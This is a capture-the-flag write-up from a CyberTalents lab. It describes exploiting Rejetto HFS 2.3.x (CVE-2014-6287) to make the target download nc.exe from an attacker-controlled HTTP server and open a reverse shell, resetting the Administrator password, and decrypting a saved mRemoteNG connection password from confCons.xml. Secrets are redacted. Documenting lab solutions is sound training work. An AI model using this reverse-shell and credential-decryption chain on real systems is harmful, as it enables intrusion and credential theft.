# CyberTalents — Remote

> **Write-up note:** This document intentionally hides the final flag, recovered credentials, encrypted values, and all real IP addresses. Replace `<target-ip>` with the current private IP shown by the CyberTalents lab and `<attacker-ip>` with the Kali VPN address assigned to the current session. The target IP can change whenever the lab is restarted.
>
> **Scope:** I performed these steps inside the authorized CyberTalents training environment. Do not run the exploit or credential-decryption workflow against systems or configuration files without permission.

## 1. Challenge overview

The challenge exposed a Windows machine running **Rejetto HTTP File Server (HFS) 2.3.x** on TCP port `1337`. The initial objective was to obtain command execution, enumerate the Windows host, and follow a hint that pointed toward a remote connection manager.

The important application discovered during enumeration was **mRemoteNG**. Its `confCons.xml` file contained a saved connection node and an encrypted password. The final step was to decrypt the correct `Password` attribute inside that node. The top-level `Protected` attribute was a distraction for this challenge, not the stored connection password I needed.

## 2. Prepare the VPN connection

I first connected Kali to the CyberTalents VPN using the profile supplied by the platform.

```bash
sudo openvpn --config <vpn-profile>.ovpn
```

A successful connection ended with a message similar to:

```text
Initialization Sequence Completed
```

I confirmed that the VPN interface existed and noted its current address:

```bash
ip -brief addr show tun0
ip route
```

The address assigned to `tun0` is the **attacker VPN IP**. I used that address as `<attacker-ip>` in the reverse-shell configuration. I did not use an unrelated local Wi-Fi or public address.

### VPN troubleshooting notes

During one attempt, OpenVPN stopped at a TLS negotiation timeout. I checked that the VPN profile was current, that the internet connection worked, and that OpenVPN was running with the required privileges. I did not treat the VPN as connected until `Initialization Sequence Completed` appeared.

```bash
ping -c 3 example.com
sudo openvpn --config <vpn-profile>.ovpn
```

If the lab is restarted, I reconnect the VPN and use the **new** target address shown by the platform. I do not reuse an IP from an earlier lab instance.

## 3. Identify the target service

After the VPN connected, I scanned the current target address. The important service was HFS on port `1337`.

```bash
nmap -sC -sV -p 1337 <target-ip>
```

I also checked the HTTP service in a browser or with curl:

```bash
curl -i http://<target-ip>:1337/
```

**Observed result (sanitized):**

```text
1337/tcp open  http  Rejetto HTTP File Server 2.3.x
```

### Analysis

The service version matched the known Rejetto HFS 2.3.x remote command execution issue, **CVE-2014-6287**. The vulnerable search functionality can interpret a crafted macro request after a null-byte sequence. Exploit-DB documents this issue and provides the reference exploit used during the lab.

## 4. Find and review the public exploit

I searched the local Exploit-DB database:

```bash
searchsploit rejetto hfs
```

The relevant result was the Windows remote exploit numbered `39161.py`. I copied the reference exploit into my working directory:

```bash
searchsploit -m windows/remote/39161.py
```

The original file was written for Python 2. Running it directly with Python 3 caused compatibility errors, including:

- `unicodeescape` because Windows paths contain backslashes such as `\Users`.
- `ModuleNotFoundError` for the old Python 2 module `urllib2`.
- The Python 2 `print` statement syntax.
- An indentation mismatch after manual edits.

Rather than mixing partial edits into the old file, I kept a separate Python 3 adaptation in **[`hfs_rce.py`](hfs_rce.py)**. It follows the same three-stage workflow as the reference exploit: create a VBScript file, run it to download `nc.exe`, and launch the reverse command shell.

## 5. Prepare the callback tools

The exploit downloads a Windows Netcat executable named `nc.exe` from my Kali machine. I placed a Windows build that supports the `-e` option in the working directory. I did not include the binary in this GitHub package.

I confirmed that the file existed:

```bash
ls -l nc.exe
```

### 5.1 Start the HTTP server

I opened a terminal in the directory containing `nc.exe` and started a Python HTTP server on port `80`. The exploit expects this port because the downloader URL does not specify a different port.

```bash
cd <directory-containing-nc.exe>
sudo python3 -m http.server 80
```

The server displayed a message similar to:

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

A previous attempt returned `404 File not found`. That happened because the HTTP server was running from a directory that did not contain `nc.exe`. I fixed it by moving to the correct directory before starting the server.

### 5.2 Start the reverse-shell listener

In a second terminal, I started Netcat on the same port configured in the exploit:

```bash
nc -lvnp 5555
```

Expected listener status:

```text
listening on [any] 5555 ...
```

I used the same port in both the listener and the exploit command.

## 6. Trigger the HFS exploit

I ran the Python 3 adaptation from a third terminal. The arguments are the current target address, HFS port, my VPN address, and the callback port:

```bash
python3 hfs_rce.py <target-ip> 1337 <attacker-ip> 5555
```

The script sends three HFS macro requests:

1. Save a VBScript file under `C:\Users\Public`.
2. Execute the VBScript so the target downloads `nc.exe` from my HTTP server.
3. Execute `nc.exe` and connect back to my Netcat listener.

**Example script output (sanitized):**

```text
[!] Use only in your authorized CyberTalents lab.
[+] Target: <target-ip>:1337
[+] Callback: <attacker-ip>:5555
[+] Sending the VBS file-creation request...
    HTTP status: 200
[+] Executing the VBS downloader...
    HTTP status: 200
[+] Starting the reverse CMD connection...
    HTTP status: 200
[+] Requests sent. Check the HTTP server log and the Netcat listener.
```

An HTTP `200` response only confirms that the HTTP request was handled. It does **not** prove that the reverse shell connected. I checked both the HTTP server log and the Netcat listener.

### 6.1 Verify the file download

The HTTP server showed a successful request similar to:

```text
<target-ip> - - "GET /nc.exe HTTP/1.1" 200 -
```

This confirmed that the Windows machine downloaded the file. When the connection arrived, the Netcat terminal showed a line similar to:

```text
connect to [<attacker-ip>] from (UNKNOWN) [<target-ip>] <source-port>
Microsoft Windows [Version ...]
C:\Users\Public>
```

I now had an interactive Windows command prompt.

### 6.2 If the listener receives nothing

I checked these items before retrying:

- `nc.exe` exists in the directory served by Python.
- The HTTP server reports `GET /nc.exe` with status `200`, not `404`.
- `<attacker-ip>` is the current VPN address on `tun0`.
- The listener port matches the callback port in the script.
- The target address and port are still current and reachable.

The Exploit-DB entry notes that the request sequence may need to be run more than once. I only retried after confirming the correct current target IP, HTTP file availability, and listener configuration.

I rechecked the target service with:

```bash
nc -zv <target-ip> 1337
nmap -p 1337 <target-ip>
```

The lab address changed after a reset, so using an old target address caused connection failures. I refreshed the address from the platform before running the exploit again.

## 7. Enumerate the Windows host

After obtaining the shell, I checked the current account and operating system:

```cmd
whoami
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

I enumerated local accounts:

```cmd
net user
```

**Observed account list (sanitized):**

```text
Administrator
DefaultAccount
Guest
WDAGUtilityAccount
```

There was no local account named `flag` on this Windows host. This mattered later: the `flag` username in `confCons.xml` belonged to a saved remote connection entry, not necessarily to a local account on the machine I had compromised.

I inspected the Administrator desktop:

```cmd
dir C:\Users\Administrator\Desktop
 type C:\Users\Administrator\Desktop\flag.txt
```

The file contained a hint indicating that the flag was not stored at that location and might be available remotely. I treated this as a direction to inspect remote-access tools and saved connection details, rather than as the final answer.

## 8. Access the Windows desktop when needed

The lab shell allowed me to inspect the system. I also used Remote Desktop to examine the desktop environment and the installed tools.

Where I had sufficient administrative privileges, I changed the local Administrator password to a temporary lab-only value:

```cmd
net user Administrator <temporary-password>
```

The expected success message was:

```text
The command completed successfully.
```

I then connected to the current target through an RDP client using the Administrator account and the temporary password. I did not publish that temporary password in this write-up.

> This password change was only a way to access the lab desktop. It was not the final credential or the flag.

## 9. Discover mRemoteNG

The hint led me to **mRemoteNG**, a Windows connection manager that stores multiple remote sessions in one interface. It can save connection properties such as protocol, hostname, port, username, and an encrypted password.

I found the application under:

```text
C:\Program Files (x86)\mRemoteNG\
```

I also found its shortcut under the Public Desktop:

```text
C:\Users\Public\Desktop\mRemoteNG.lnk
```

The application configuration was stored in the Administrator profile:

```text
C:\Users\Administrator\AppData\Roaming\mRemoteNG\confCons.xml
```

I located the configuration file and listed the related files:

```cmd
where /r C:\Users confCons.xml
 dir C:\Users\Administrator\AppData\Roaming\mRemoteNG
```

I inspected the configuration and the application log:

```cmd
type C:\Users\Administrator\AppData\Roaming\mRemoteNG\confCons.xml
type C:\Users\Administrator\AppData\Roaming\mRemoteNG\mRemoteNG.log
findstr /i "disconnected 516 cybertalents" C:\Users\Administrator\AppData\Roaming\mRemoteNG\mRemoteNG.log
```

The XML contained a connection node with these non-secret properties:

```xml
<Node
    Name="flag"
    Hostname="cybertalents.com"
    Port="3389"
    Protocol="RDP"
    Username="flag"
    Password="[REDACTED_ENCRYPTED_NODE_PASSWORD]" />
```

The root `<mrng:Connections>` element also contained an encrypted `Protected` attribute. I kept these two attributes separate during the analysis.

### Analysis

- `Name="flag"` identified the connection entry.
- `Hostname`, `Port`, and `Protocol` described the saved remote connection.
- `Username` was the username configured for that connection.
- `Password` held the encrypted password for that specific node.
- `Protected` belonged to the root configuration element and served a different purpose. It was not the node's saved connection password.

## 10. Check the saved RDP connection and review the logs

I tested the saved mRemoteNG connection to understand where it pointed. The entry used RDP on port `3389` and referenced `cybertalents.com`.

The connection did not open. The mRemoteNG log recorded an RDP disconnect with error `516`, indicating that the configured remote endpoint was not reachable or did not accept the RDP connection from this environment.

**Relevant log output (sanitized):**

```text
Protocol Event Disconnected.
Message: 516
Remote Desktop can't connect to the remote computer for one of these reasons:
1) Remote access to the server is not enabled
2) The remote computer is turned off
3) The remote computer is not available on the network
RDP disconnected!
Connection to cybertalents.com via RDP closed.
```

I also tried the saved username against the compromised lab host using an RDP client. The connection reached the NLA authentication stage but ended with a logon failure. The local `net user` output did not contain that username, so I did not confuse the saved remote connection account with a local Windows account. I also checked the `extApps.xml` and backup-related files in the mRemoteNG profile; they did not provide the needed value.

### Analysis

The failed RDP connection was a dead end for this challenge instance. I did not need to establish that remote desktop session to inspect the saved credential. I could work offline with `confCons.xml` instead.

## 11. Understand the mRemoteNG encryption format

The configuration indicated AES encryption, GCM mode, and `1000` key-derivation iterations. For the mRemoteNG 1.75+ AES-GCM format used here, the Base64 value is structured as:

```text
16-byte PBKDF2 salt | 16-byte GCM nonce | ciphertext | 16-byte GCM tag
```

The key is derived with PBKDF2-HMAC-SHA1. In this configuration, the first 16 bytes (the salt) are also supplied to AES-GCM as **associated authenticated data (AAD)**. The AAD is added before verifying the GCM tag.

This detail explained why my first decryption attempts failed with `MAC check failed`: the initial implementation did not provide the associated data required by the format.

### The important distinction: `Protected` versus node `Password`

I initially selected the root-level `Protected` value and passed it to the decryptor. It returned a marker string used by mRemoteNG to check the configuration's protection state. That value was not the connection password and was not the final answer.

I then returned to the XML and selected the `Password` attribute from the `<Node Name="flag">` element. That was the encrypted node credential needed for this challenge.

## 12. Set up the decryption script

I kept the decryption code in a separate file: **[`mremoteng_decrypt.py`](mremoteng_decrypt.py)**.

Kali may reject a system-wide `pip install` because its Python environment is externally managed (PEP 668). I used a virtual environment instead:

```bash
sudo apt update
sudo apt install -y python3-venv
python3 -m venv .venv
source .venv/bin/activate
python -m pip install pycryptodome
```

I verified the dependency:

```bash
python -c "from Crypto.Cipher import AES; print('PyCryptodome is ready')"
```

## 13. Decrypt the correct node password

I copied `confCons.xml` to my Kali working directory using the file-transfer method available in the lab. I then ran the script against the XML file:

```bash
python3 mremoteng_decrypt.py --xml confCons.xml
```

The script reads each `<Node>` element and decrypts its non-empty `Password` attribute. It uses the default mRemoteNG master password configured in the script's command-line defaults. If a configuration uses a custom master password, it can be supplied explicitly:

```bash
python3 mremoteng_decrypt.py --xml confCons.xml --master-password '<master-password>'
```

I could also decrypt a single Base64 value copied from the node's `Password` attribute:

```bash
python3 mremoteng_decrypt.py --value '<REDACTED_NODE_PASSWORD_BASE64>'
```

**Output format (secret intentionally hidden):**

```text
[+] Node='flag' | Username='flag' | Password=[REDACTED]
```

The key parts of the implementation are:

1. Decode the Base64 data.
2. Split the bytes into salt, nonce, ciphertext, and authentication tag.
3. Derive a 32-byte key using PBKDF2-HMAC-SHA1 and the configured iteration count.
4. Initialize AES-GCM with the nonce.
5. Supply the salt using `cipher.update(salt)` as associated data.
6. Decrypt and verify the authentication tag.

I used the node's `Password` attribute—not the root `Protected` attribute. The decrypted result was the value required by the challenge. **The actual value is intentionally omitted from this public write-up.**

## 14. Final verification

I submitted the recovered value through the CyberTalents challenge page. The platform accepted it. The flag itself and every plaintext answer are intentionally redacted here so this document can be published without disclosing the solution.

## 15. Troubleshooting summary

| Symptom | Cause | Resolution |
|---|---|---|
| OpenVPN TLS negotiation timeout | VPN session/profile or network path was not ready | Verify internet access, use the current VPN profile, and wait for `Initialization Sequence Completed` |
| HFS connection refused | Stale target IP, stopped lab service, or disconnected VPN | Refresh the lab IP, verify `tun0`, and recheck TCP/1337 |
| Python `unicodeescape` | Windows backslashes interpreted as Python escape sequences | Use raw strings or correctly escaped backslashes |
| `urllib2` not found | Original exploit targets Python 2 | Use the separate Python 3 adaptation |
| Python 2 `print` syntax / indentation errors | Legacy code was partially edited | Use a clean Python 3 script rather than mixing tabs and spaces |
| HTTP `404` for `/nc.exe` | HTTP server started in the wrong directory | Start the server from the directory containing `nc.exe` |
| Netcat receives no connection | Wrong callback IP/port, failed download, or script did not execute | Check the HTTP log, listener, VPN IP, and matching ports |
| RDP error `516` | Saved endpoint was unavailable from the lab environment | Stop treating RDP as the required path and inspect the local configuration offline |
| AES-GCM `MAC check failed` | Incorrect encrypted attribute or missing AAD | Use the node's `Password` value and call `cipher.update(salt)` before verification |
| No `Crypto` module | PyCryptodome is not installed in the active Python environment | Install it inside the activated virtual environment |

## 16. Key takeaways

- I refreshed the target IP after every lab restart instead of reusing a stale address.
- I confirmed the reverse shell by checking both the HTTP download log and the Netcat listener. An HTTP `200` alone was not enough.
- I treated the desktop `flag.txt` as a hint, not as the final flag.
- I distinguished an mRemoteNG connection entry from a local Windows account.
- I checked the actual XML element and attribute before attempting decryption.
- I included the GCM associated data. Without it, a correct key and ciphertext can still fail authentication.
- I decrypted the `Password` attribute inside the relevant `<Node>`, not the root-level `Protected` attribute.
- I kept recovered credentials, the final flag, and real IP addresses out of the public report.

## References

- [Exploit-DB 39161 — Rejetto HFS 2.3.x Remote Command Execution](https://www.exploit-db.com/exploits/39161)
- [mRemoteNG configuration encryption notes](https://www.errno.fr/mRemoteNG)
- [mRemoteNG AES-GCM implementation reference (v1.76)](https://github.com/mRemoteNG/mRemoteNG/blob/release/v1.76/mRemoteV1/Security/SymmetricEncryption/AeadCryptographyProvider.cs)
- [mRemoteNG decryption example by kolokokop](https://gist.github.com/kolokokop/deec5d4ba3fa1fb5ce5268244f743955)
- [mRemoteNG decryption implementation showing the GCM AAD step](https://github.com/OSSSP/mremoteng-decrypt-1)

---

